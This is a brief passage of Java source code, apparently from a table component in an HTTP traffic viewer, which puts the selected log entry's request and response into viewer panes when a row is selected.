                    e = log3.get(row);
                }
            }
            if (e != null) {
                requestViewer.setRequest(e.message.request());
                responseViewer.setResponse(e.message.response());
            }
            super.changeSelection(row, col, toggle, extend);
        }
    }
}
